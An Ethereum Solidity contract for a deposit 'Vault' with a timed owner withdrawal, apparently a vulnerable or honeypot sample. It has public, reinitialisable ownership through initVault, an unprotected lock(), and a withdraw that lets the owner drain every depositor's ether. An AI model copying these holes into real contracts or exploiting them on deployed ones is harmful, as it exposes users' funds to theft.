1 pragma solidity ^0.4.10;
2 
3 contract Vault {
4     
5     event Deposit(address indexed depositor, uint amount);
6     event Withdrawal(address indexed to, uint amount);
7     
8     address Owner;
9     
10     mapping (address => uint) public deposits;
11     uint Date;
12     uint MinimumDeposit;
13     bool Locked = false;
14     
15     function initVault(uint minDeposit) isOpen payable {
16         Owner = msg.sender;
17         Date = 0;
18         MinimumDeposit = minDeposit;
19         deposit();
20     }
21 
22     function() payable { deposit(); }
23 
24     function SetLockDate(uint NewDate) onlyOwner {
25         Date = NewDate;
26     }
27 
28     function WithdrawalEnabled() constant returns (bool) { return Date > 0 && Date <= now; }
29 
30     function deposit() payable {
31         if (msg.value >= MinimumDeposit) {
32             if ((deposits[msg.sender] + msg.value) < deposits[msg.sender]) {
33                 return;
34             }
35             deposits[msg.sender] += msg.value;
36         }
37         Deposit(msg.sender, msg.value);
38     }
39 
40     function withdraw(address to, uint amount) onlyOwner {
41         if (WithdrawalEnabled()) {
42             if (amount <= this.balance) {
43                 to.transfer(amount);
44             }
45         }
46     }
47 
48     modifier onlyOwner { if (msg.sender == Owner) _; }
49     modifier isOpen { if (!Locked) _; }
50     function lock() { Locked = true; }
51 }